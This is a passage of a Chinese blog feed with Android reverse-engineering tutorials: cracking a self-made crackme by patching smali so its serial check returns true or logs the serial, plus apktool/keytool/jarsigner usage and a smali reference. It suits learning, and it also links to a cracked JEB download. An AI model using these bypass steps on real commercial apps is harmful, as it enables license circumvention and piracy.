hexString.append(hex).append(separator);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> hexString.toString();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>onCreate方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">    setContentView(R.layout.activity_main);</div><div class="line">    setTitle(R.string.app_name);</div><div class="line"></div><div class="line">    <span class="keyword">final</span> EditText et_username = (EditText) findViewById(R.id.login_edit_account);</div><div class="line">    <span class="keyword">final</span> EditText et_sn = (EditText) findViewById(R.id.login_edit_pwd);</div><div class="line">    <span class="keyword">final</span> Button bt_login = (Button) findViewById(R.id.login_btn_login);</div><div class="line"></div><div class="line">    bt_login.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line"></div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">            <span class="keyword">if</span>(!checkSN(et_username.getText().toString().trim(),</div><div class="line">                    et_sn.getText().toString().trim()))&#123;</div><div class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, R.string.fail, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, R.string.success, Toast.LENGTH_SHORT).show();</div><div class="line">                bt_login.setEnabled(<span class="keyword">false</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>运行结果:<br><img src="https://i.imgur.com/4a0Ul5O.png" alt=""></p><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>调试信息: atl+6可以查看log.d()的调试结果.<br>修改保存路径: Create new project -&gt; Select Project Location<br>生成apk的位置: 存储路径下app/build/outputs/apk<br>Terminal窗口: 可以查看当前文件的位置<br>生成版本: Build-&gt;Edit Build Types-&gt;release<br>生成: Build-&gt;Build Apk</p><h1 id="破解Crackme1"><a href="#破解Crackme1" class="headerlink" title="破解Crackme1"></a>破解Crackme1</h1><p>破解Android程序通常的方法是将apk文件利用ApkTool反编译或者Apkdb反编译，生成Smali格式的返汇编代码，然后阅读Smali文件的代码来理解程序运行的机制，找到程序的突破口进行修改。最后使用ApkTool重新编译生成apk文件并签名，最后进行测试是否破解成功。<br>在实际的分析过程中，还可以使用ida直接分析apk,或者dex2jar与jd-gui配合来进行java源码级的分析等。</p><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><h3 id="使用jd-gui查看Crackme1"><a href="#使用jd-gui查看Crackme1" class="headerlink" title="使用jd-gui查看Crackme1"></a>使用jd-gui查看Crackme1</h3><p><img src="https://i.imgur.com/NIdbxui.png" alt=""><br>这里就是返回结果为true则成功。接着我们使用apkdb[这是一键编译，方便点]反编译apk，并找到MainActvity.smali代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar apktool.jar d demo.apk</div></pre></td></tr></table></figure></p><p>调用checkSN方法，参数是传递两个string[p1,p2]，返回值是Z[boolean]布尔型<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.locals</span> 1</div><div class="line"><span class="keyword">.param</span> p0, <span class="string">"x0"</span>    <span class="comment"># Lcom/example/ese/crackme1/MainActivity;</span></div><div class="line"><span class="keyword">.param</span> p1, <span class="string">"x1"</span>    <span class="comment"># Ljava/lang/String;</span></div><div class="line"><span class="keyword">.param</span> p2, <span class="string">"x2"</span>    <span class="comment"># Ljava/lang/String;</span></div><div class="line"></div><div class="line"><span class="keyword">.prologue</span></div><div class="line"><span class="keyword">.line</span> 13</div><div class="line">invoke-direct &#123;p0, p1, p2&#125;, <span class="class">Lcom/example/ese/crackme1/MainActivity;</span>-&gt;checkSN(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)Z</div><div class="line"></div><div class="line">move-result v0   //返回结果</div><div class="line"></div><div class="line">return v0</div></pre></td></tr></table></figure></p><p>这里将返回结果修改为1，<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">  <span class="built_in"> move-result </span>v0  //返回结果</div><div class="line"></div><div class="line">const/4 v0, 0x1</div><div class="line"></div><div class="line">  <span class="built_in"> return </span>v0</div></pre></td></tr></table></figure></p><p>在进行打包和签名。安装，成功绕过。<a href="https://esebanana.github.io/2018/06/19/android_5_tools/" target="_blank" rel="external">这里</a>有反编译打包回来，签名的方法。</p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>使用ddms动态<a href="https://esebanana.github.io/2018/06/19/android_5_tools/" target="_blank" rel="external">调试</a>，在程序算出sn的时候，我们将sn打印出来。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.line</span> 60</div><div class="line">:cond_2</div><div class="line">invoke-virtual &#123;v5&#125;, <span class="class">Ljava/lang/StringBuilder;</span>-&gt;toString()<span class="class">Ljava/lang/String;</span></div><div class="line"></div><div class="line">move-result-object v6</div><div class="line"></div><div class="line"><span class="keyword">.line</span> 64</div><div class="line"><span class="keyword">.local</span> v6, <span class="string">"userSN"</span>:<span class="class">Ljava/lang/String;</span></div></pre></td></tr></table></figure></p><p>修改<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.line</span> 60</div><div class="line">:cond_2</div><div class="line">invoke-virtual &#123;v5&#125;, <span class="class">Ljava/lang/StringBuilder;</span>-&gt;toString()<span class="class">Ljava/lang/String;</span></div><div class="line"></div><div class="line">move-result-object v6</div><div class="line"></div><div class="line">const-string v3,<span class="string">"TEST"</span></div><div class="line">invoke-static&#123;v3,v6&#125;,<span class="class">Landroid/util/Log;</span>-&gt;i(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line"></div><div class="line"><span class="keyword">.line</span> 64</div><div class="line"><span class="keyword">.local</span> v6, <span class="string">"userSN"</span>:<span class="class">Ljava/lang/String;</span></div></pre></td></tr></table></figure></p><p>这是添加log.d(“TEST”,v6),v6就是算出来序列号的值。然后在反编译回去，签名。运行结果:<br><img src="https://i.imgur.com/uJSPMek.png" alt=""><br>输入，显示成功</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android stdio 第一个程序 Crackme1&lt;br&gt;
    
    </summary>
    
      <category term="android" scheme="http://yoursite.com/categories/android/"/>
    
    
  </entry>
  
  <entry>
    <title>Android工具及其使用</title>
    <link href="http://yoursite.com/2018/06/19/android_5_tools/"/>
    <id>http://yoursite.com/2018/06/19/android_5_tools/</id>
    <published>2018-06-19T00:49:18.000Z</published>
    <updated>2018-07-10T10:38:55.614Z</updated>
    
    <content type="html"><![CDATA[<p>常用的android工具安装以及apktool反编译，ddms,jeb2使用等<br><a id="more"></a><br><a href="https://pan.baidu.com/s/1gx1Lr15t2UjFcshQ5ZstMA" target="_blank" rel="external">下载</a>工具</p><h1 id="adb"><a href="#adb" class="headerlink" title="adb"></a>adb</h1><p>直接解压。配置环境变量<br>然后在cmd下输入adb(下面就是成功):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Android Debug Bridge version <span class="number">1.0</span><span class="number">.39</span></div><div class="line">Version <span class="number">0.0</span><span class="number">.1</span><span class="number">-4500957</span></div><div class="line">Installed as G:\job\android\tools\platform-tools-latest-windows\adb.exe</div><div class="line"></div><div class="line">global options:</div><div class="line"> -a         listen on all network interfaces, <span class="keyword">not</span> just localhost</div><div class="line"> -<span class="function">d         use USB <span class="title">device</span> <span class="params">(error <span class="keyword">if</span> multiple devices connected)</span></span></div><div class="line"> -e         use TCP/IP device (error if multiple TCP/IP devices available)</div><div class="line"> -<span class="function">s SERIAL  use device with given <span class="title">serial</span> <span class="params">(overrides $ANDROID_SERIAL)</span></span></div><div class="line"> -t ID      use device with given transport id</div><div class="line"> -H         name of adb server host [<span class="keyword">default</span>=localhost]</div><div class="line"> -P         port of adb server [<span class="keyword">default</span>=<span class="number">5037</span>]</div><div class="line"> -L SOCKET  listen on given socket <span class="keyword">for</span> adb server [<span class="keyword">default</span>=tcp:localhost:<span class="number">5037</span>]</div></pre></td></tr></table></figure></p><p>这里以夜神模拟器<a href="https://jingyan.baidu.com/article/ed15cb1ba2b7561be2698111.html" target="_blank" rel="external">设置</a></p><p>连接<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&gt;adb devices</div><div class="line">List of devices attached</div><div class="line">&gt;adb connect <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">62001</span></div><div class="line">connected to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">62001</span></div><div class="line">&gt;adb devices</div><div class="line">List of devices attached</div><div class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">62001</span> device</div><div class="line">&gt;adb shell</div><div class="line">root@android:/ <span class="meta"># ls</span></div></pre></td></tr></table></figure></p><p>连接成功</p><h1 id="dex2jar与jd-gui"><a href="#dex2jar与jd-gui" class="headerlink" title="dex2jar与jd-gui"></a>dex2jar与jd-gui</h1><p>dex2jar可以直接获取apk的java源码，jd-gui可以直接获取jar的java源码</p><h1 id="apktool反编译"><a href="#apktool反编译" class="headerlink" title="apktool反编译"></a>apktool反编译</h1><p>apk反编译<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar apktool.jar d demo.apk</div></pre></td></tr></table></figure></p><p>之后对smali进行修改，然后对修改好的进行打包。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar apktool.jar b -d demo -o debug.apk</div></pre></td></tr></table></figure></p><p>这里一般apk都不能安装(如果这里能按装apk，就不用签名啦)，接着进行签名。<a href="https://blog.csdn.net/u013210620/article/details/49621367" target="_blank" rel="external">生成</a>自己的签名文件，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">keytool -genkey -alias android.keystore -keyalg RSA -validity <span class="number">20000</span> -keystore android.keystore</div></pre></td></tr></table></figure></p><p>各个参数解释如下：</p><p>-genkey 产生证书文件<br>-alias 产生别名<br>-keystore 指定密钥库的.keystore文件中<br>-keyalg 指定密钥的算法,这里指定为RSA(非对称密钥算法)<br>-validity 为证书有效天数，这里我们写的是20000天</p><p>这里生成android.keystore签名,进行apk签名<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">输入keystore密码：</div><div class="line">再次输入新密码:</div><div class="line">您的名字与姓氏是什么？</div><div class="line">  [Unknown]：  test</div><div class="line">您的组织单位名称是什么？</div><div class="line">  [Unknown]：  test</div><div class="line">您的组织名称是什么？</div><div class="line">  [Unknown]：</div><div class="line">您所在的城市或区域名称是什么？</div><div class="line">  [Unknown]：</div><div class="line">您所在的州或省份名称是什么？</div><div class="line">  [Unknown]：</div><div class="line">该单位的两字母国家代码是什么</div><div class="line">  [Unknown]：</div><div class="line">CN=test, OU=test, O=Unknown, L=Unknown, ST=Unknown, C=Unknown 正确吗？</div><div class="line">  [否]：  y</div><div class="line"></div><div class="line"></div><div class="line">输入&lt;android.keystore&gt;的主密码</div><div class="line">        （如果和 keystore 密码相同，按回车）：</div></pre></td></tr></table></figure></p><p>签名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jarsigner -verbose -keystore android.keystore Crackme1_modify.apk android.keystore</div></pre></td></tr></table></figure></p><p>在安装apk。安装成功</p><h1 id="ddms-Dalvik-Debug-Monitor-Service"><a href="#ddms-Dalvik-Debug-Monitor-Service" class="headerlink" title="ddms(Dalvik Debug Monitor Service)"></a>ddms(Dalvik Debug Monitor Service)</h1><p>DDMS的作用它提供截屏，查看线程和堆的信息，logcat，进程，广播状态信息，模拟来电呼叫和短信，虚拟地理坐标等等。 </p><h2 id="运行ddms-bat"><a href="#运行ddms-bat" class="headerlink" title="运行ddms.bat"></a>运行ddms.bat</h2><p>会出现一个命令行界面和图形化界面<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">The standalone version of DDMS is deprecated.</div><div class="line">Please use Android Device Monitor (monitor.bat) instead.</div></pre></td></tr></table></figure></p><p>这是打开模拟器，然后命令行:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">The standalone version of DDMS is deprecated.</div><div class="line">Please use Android Device Monitor (monitor.bat) instead.</div><div class="line">06:38:13 W/DeviceMonitor: Adb rejected connection to client '745': closed</div><div class="line">06:38:13 W/DeviceMonitor: Adb rejected connection to client '745': closed</div><div class="line">06:38:13 W/DeviceMonitor: Adb rejected connection to client '762': closed</div><div class="line">06:38:13 W/DeviceMonitor: Adb rejected connection to client '762': closed</div><div class="line"><span class="number">06</span>:<span class="number">38</span>:<span class="number">26</span> W/EmulatorConsole: Failed to find emulator port from serial: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">62001</span></div></pre></td></tr></table></figure></p><p>这就显示连接上模拟器，在smali中添加打印函数<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">const-string v3,<span class="string">"TEST"</span></div><div class="line">invoke-static&#123;v3,v6&#125;,<span class="class">Landroid/util/Log;</span>-&gt;i(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div></pre></td></tr></table></figure></p><p>是函数log.d(“TEST”,v6)。模拟器中运行apk,结果如图[这是一个<a href="https://esebanana.github.io/2018/06/22/android_7_apk_crackme/" target="_blank" rel="external">test</a>]:<br><img src="https://i.imgur.com/uJSPMek.png" alt=""></p><h1 id="jeb2动态调试apk"><a href="#jeb2动态调试apk" class="headerlink" title="jeb2动态调试apk"></a>jeb2动态调试apk</h1><p>下载<a href="https://down.52pojie.cn/Tools/Android_Tools/jeb-2.2.7.201608151620_crack_qtfreet00.zip" target="_blank" rel="external">jeb</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常用的android工具安装以及apktool反编译，ddms,jeb2使用等&lt;br&gt;
    
    </summary>
    
      <category term="android" scheme="http://yoursite.com/categories/android/"/>
    
    
  </entry>
  
  <entry>
    <title>Smali语法</title>
    <link href="http://yoursite.com/2018/06/16/android_6_smali/"/>
    <id>http://yoursite.com/2018/06/16/android_6_smali/</id>
    <published>2018-06-16T00:49:18.000Z</published>
    <updated>2018-06-23T02:55:06.454Z</updated>
    
    <content type="html"><![CDATA[<p>常用的Smali语法<br><a id="more"></a></p><h1 id="smali寄存器"><a href="#smali寄存器" class="headerlink" title="smali寄存器"></a>smali寄存器</h1><p>在虚拟机Dalvik中，方法中有两种方式定义方法中可以使用的寄存器数量。.registers 指令定义了方法中可以使用的寄存器的总数量。可以选择性的使用.locals ，该指令定义了方法中非参数寄存器的数量。寄存器的总数量应当包括方法参数所使用的寄存器的数量<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">v字命名p字命名说明</div><div class="line">v0the first local register</div><div class="line">v1the sencond local register</div><div class="line">v2lp0the first paramter register</div><div class="line">v3p1the second parameter register</div><div class="line">v4p2the third parameter register</div></pre></td></tr></table></figure></p><h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><h2 id="赋值指令"><a href="#赋值指令" class="headerlink" title="赋值指令"></a>赋值指令</h2><p>move(move destination)。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">move va,vb               <span class="comment">#将va=vb</span></div><div class="line">move/from16 va,vb        <span class="comment">#  va=vb   va(为8位寄存器) vb(为16位寄存器)</span></div><div class="line"></div><div class="line">move-result vaa          <span class="comment">#将上一个invoke类型指令操作的单字非对象结果返回给vaa</span></div><div class="line">move-result-object vaa          <span class="comment">#将上一个invoke类型指令操作的对象结果返回给vaa</span></div><div class="line">move-exception vaa          <span class="comment">#保存一个运行时发生的异常到vaa</span></div><div class="line">throw vaa                   <span class="comment">#抛出vaa寄存器的异常</span></div></pre></td></tr></table></figure></p><h2 id="定义指令"><a href="#定义指令" class="headerlink" title="定义指令"></a>定义指令</h2><p>数据定义指令用来定义程序中用到的常量、字符串、类等。<br>基础字节码为const<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">const/4 va,<span class="comment">#+b          #将数值符号扩展为32位后赋值给寄存器va</span></div><div class="line">const/16 vaa,<span class="comment">#+bbbb          #将数值符号扩展为32位后赋值给寄存器vaa</span></div><div class="line">const va,<span class="comment">#+bbbbbbb          #将数值赋值给寄存器va</span></div><div class="line">const/high16 vaa,<span class="comment">#+bbbb          #将数值右边零扩展为32位后赋值给寄存器vaa</span></div><div class="line">const-wide/16 vaa,<span class="comment">#+bbbb          #将数值符号扩展为64位后赋值给寄存器vaa</span></div><div class="line"></div><div class="line">const-string vaa,string@bbb  <span class="comment">#将字符串赋值给寄存器vaa</span></div></pre></td></tr></table></figure></p><h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><p>跳转指令用于从当前地址跳转到指定的偏移处。Dalvik指令集中有三种跳转指令：无条件跳转（goto），分支跳转（switch）与条件跳转（if）。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">goto +AA            <span class="comment">#无条件跳转到指定偏移处，偏移量AA不能为0。</span></div><div class="line">packed-switch vAA, +BBBBBBBB  <span class="comment">#分支跳转指令。vAA寄存器为switch分支中需要判断的值BBBBBBBB指向一个packed-switch-payload格式的偏移表，表中的值是有规律递增的。</span></div><div class="line">sparse-switch vAA, +BBBBBBBB  <span class="comment">#分支跳转指令。vAA寄存器为switch分支中需要判断的值，BBBBBBBB指向一个sparse-switch-payload格式的偏移表，表中的值是无规律的偏移量。</span></div><div class="line"></div><div class="line">if-eq   <span class="comment">#如果vA等于vB则跳转。Java语法表示为“if(vA == vB)”</span></div><div class="line">if-ne  <span class="comment">#如果vA不等于vB则跳转。Java语法表示为“if(vA != vB)”</span></div><div class="line">if-lt  <span class="comment">#如果vA小于vB则跳转。Java语法表示为“if(vA &lt; vB)”</span></div><div class="line">if-ge  <span class="comment">#如果vA大于等于vB则跳转。Java语法表示为“if(vA &gt;= vB)”</span></div><div class="line">if-gt  <span class="comment">#如果vA大于vB则跳转。Java语法表示为“if(vA &gt; vB)”</span></div><div class="line">if-le  <span class="comment">#如果vA小于等于vB则跳转。Java语法表示为“if(vA &lt;= vB)”</span></div><div class="line"></div><div class="line">if-eqz  <span class="comment">#如果vAA为0则跳转。Java语法表示为“if(vAA == 0)”</span></div><div class="line">if-nez  <span class="comment">#如果vAA不为0则跳转。Java语法表示为“if(vAA != 0)”</span></div><div class="line">if-ltz  <span class="comment">#如果vAA小于0则跳转。Java语法表示为“if(vAA &lt; 0)”</span></div><div class="line">if-gez  <span class="comment">#如果vAA大于等于0则跳转。Java语法表示为“if(vAA &gt;= 0)”</span></div><div class="line">if-gtz  <span class="comment">#如果vAA大于0则跳转。Java语法表示为“if(vAA &gt; 0)”</span></div><div class="line">if-lez  <span class="comment">#如果vAA小于等于0则跳转。Java语法表示为“if(vAA &lt;= 0)”</span></div></pre></td></tr></table></figure></p><h2 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cmpl-float   <span class="comment">#比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1</span></div><div class="line">cmpg-float   <span class="comment">#比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，则结果为1，相等则结果为0，小于的话结果为-1</span></div></pre></td></tr></table></figure><h2 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">add-type  <span class="comment">#vBB寄存器与vCC寄存器值进行加法运算（vBB + vCC）</span></div><div class="line">sub-type  <span class="comment">#vBB寄存器与vCC寄存器值进行减法运算（vBB - vCC）</span></div><div class="line">mul-type  <span class="comment">#vBB寄存器与vCC寄存器值进行乘法运算（vBB * vCC）</span></div><div class="line">div-type  <span class="comment">#vBB寄存器与vCC寄存器值进行除法运算（vBB / vCC</span></div><div class="line">rem-type  <span class="comment">#vBB寄存器与vCC寄存器值进行模运算（vBB % vCC）</span></div><div class="line">and-type  <span class="comment">#vBB寄存器与vCC寄存器值进行与运算（vBB &amp; vCC）</span></div><div class="line">or-type  <span class="comment">#vBB寄存器与vCC寄存器值进行或运算（vBB | vCC）</span></div><div class="line">xor-type  <span class="comment">#vBB寄存器与vCC寄存器值进行异或运算（vBB ^ vCC）</span></div><div class="line">shl-type  <span class="comment">#vBB寄存器值（有符号数）左移vCC位（vBB &lt;&lt; vCC ）</span></div><div class="line">shr-type  <span class="comment">#vBB寄存器值（有符号）右移vCC位（vBB &gt;&gt; vCC）</span></div><div class="line">ushr-type  <span class="comment">#vBB寄存器值（无符号数）右移vCC位（vBB &gt;&gt;&gt; vCC）</span></div></pre></td></tr></table></figure><h1 id="smali与java"><a href="#smali与java" class="headerlink" title="smali与java"></a>smali与java</h1><h2 id="简单语法"><a href="#简单语法" class="headerlink" title="简单语法"></a>简单语法</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.field</span> 　定义变量</div><div class="line"><span class="keyword">.method</span>　　方法</div><div class="line"><span class="keyword">.parameter</span>　　方法参数</div><div class="line"><span class="keyword">.prologue</span>　　方法开始</div><div class="line"></div><div class="line"><span class="keyword">.line</span> 12　　此方法位于第12行</div><div class="line">const/high16  v0, 0x7fo3　把0x7fo3赋值给v0</div><div class="line"></div><div class="line">invoke-direct　　调用函数</div><div class="line">return-void　　函数返回void</div><div class="line">invoke-static　　调用静态函数</div><div class="line">invoke-super　　调用父函数</div><div class="line"><span class="keyword">.end method</span>　　函数结束</div><div class="line"></div><div class="line">new-instance　　创建实例</div><div class="line">iput-object　　对象赋值</div><div class="line">iget-object　　调用对象</div></pre></td></tr></table></figure><h2 id="java与smali对比"><a href="#java与smali对比" class="headerlink" title="java与smali对比"></a>java与smali对比</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Smali                  JAVA</div><div class="line">V                      void</div><div class="line">Z                      boolean</div><div class="line">B                      byte</div><div class="line">S                      short</div><div class="line">C                      char</div><div class="line">I                      int</div><div class="line">J                      long</div><div class="line">F                      float</div><div class="line">D                      double</div><div class="line"></div><div class="line">引用类型</div><div class="line">L                      对象</div><div class="line">[                      数组</div></pre></td></tr></table></figure><p>先看一个smali代码熟悉下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">java代码</div><div class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">show</span><span class="params">()</span></span>&#123;</div><div class="line">                <span class="keyword">boolean</span> tempFlag = ((<span class="number">3</span>-<span class="number">2</span>)==<span class="number">1</span>)? <span class="keyword">true</span> : <span class="keyword">false</span>;</div><div class="line">                <span class="keyword">if</span> (tempFlag) &#123;</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">转换smali代码</div><div class="line">.<span class="function">method <span class="keyword">private</span> <span class="title">show</span><span class="params">()</span>Z</span></div><div class="line"><span class="function">    .locals 2</span></div><div class="line"><span class="function">    .prologue           <span class="comment">//方法开始</span></span></div><div class="line"><span class="function">    .line 22</span></div><div class="line"><span class="function">    <span class="keyword">const</span>/4 v0, 0x1     <span class="comment">// v0赋值为1</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">    .line 24</span></div><div class="line"><span class="function">    .local v0, tempFlag:Z</span></div><div class="line"><span class="function">    <span class="keyword">if</span>-eqz v0, :cond_0            <span class="comment">// 判断v0是否等于0, 不符合条件向下走, 符合条件执行cond_0分支</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">    .line 25</span></div><div class="line"><span class="function">    <span class="keyword">const</span>/4 v1, 0x1            <span class="comment">// 符合条件分支</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">    .line 27</span></div><div class="line"><span class="function">    :goto_0</span></div><div class="line"><span class="function">    return v1</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">    :cond_0</span></div><div class="line"><span class="function">    <span class="keyword">const</span>/4 v1, 0x0            <span class="comment">// cond_0分支</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">    goto :goto_0</span></div><div class="line"><span class="function">.end method</span></div></pre></td></tr></table></figure></p><h1 id="smali函数调用"><a href="#smali函数调用" class="headerlink" title="smali函数调用"></a>smali函数调用</h1><p>数组:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div 